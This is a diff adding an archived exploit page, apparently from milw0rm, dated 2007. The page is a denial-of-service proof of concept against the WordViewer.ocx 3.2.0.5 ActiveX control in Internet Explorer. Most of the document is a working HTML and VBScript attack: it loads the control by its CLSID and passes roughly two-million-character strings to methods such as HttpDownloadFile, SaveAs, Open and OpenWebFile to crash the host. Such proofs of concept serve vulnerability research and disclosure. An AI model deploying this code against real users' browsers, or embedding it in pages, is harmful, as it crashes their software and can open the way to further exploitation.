@@ -1,0 +1,75 @@
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/03</b></p></span>
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+ <b>WordViewer.ocx v. 3.2.0.5 multiple methods Denial of Service</b>
+ url: http://www.officeocx.com/
+ price: from €63.95 (update to last version) to €1,585.95 (Royalty)
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to these exploits.
+ Theese methods are vulnerable too:
+ 
+ <b>DoOleCommand</b>
+ <b>FTPDownloadFile</b>
+ <b>FTPUploadFile</b>
+ <b>HttpUploadFile</b>
+ <b>GotoPage</b>
+ <b>Save</b>
+ <b>SaveWebFile</b>
+-----------------------------------------------------------------------------
+
+<object classid='clsid:97AF4A45-49BE-4485-9F55-91AB40F22BF2' id='WordOCX' width="405" height="50"></object>
+
+<select style="width: 404px" name="Pucca">
+  <option value = "HttpDownloadFile">HttpDownloadFile</option>
+  <option value = "Open">Open</option>
+  <option value = "OpenWebFile">OpenWebFile</option>
+  <option value = "SaveAs">SaveAs</option>
+  <option value = "ShowWordStandardDialog">ShowWordStandardDialog</option>
+  <option value = "Quoting">Quoting...</option>
+</select>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  on error resume next
+   Dim MyMsg
+   if Pucca.value = "HttpDownloadFile" then
+     argCount = 2
+     arg1=String(2097512,"A")
+     arg2="defaultV"
+     WordOCX.HttpDownloadFile arg1, arg2
+   elseif Pucca.value = "SaveAs" then
+     argCount = 2
+     arg1=String(2097512,"A")
+     arg2=1
+     WordOCX.SaveAs arg1, arg2
+   elseif Pucca.value = "Open" then
+     argCount = 1
+     arg1=String(2097512, "A")
+     WordOCX.Open arg1
+   elseif Pucca.value = "ShowWordStandardDialog" then
+     argCount = 1
+     arg1=32767
+     WordOCX.ShowWordStandardDialog arg1
+   elseif Pucca.value = "OpenWebFile" then
+     argCount = 1
+     arg1=String(2097512, "A")
+     WordOCX.OpenWebFile arg1
+   else
+     MyMsg= MsgBox ("God is dead," & vbCrLf & _
+     "Marx is dead," & vbCrLf &_
+     "Freud is dead..." & vbCrLf & _
+     "And I'm not feeling too well, myself", 64, "2007/05/03 - WordViewer v. 3.2")
+   end if
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-03]
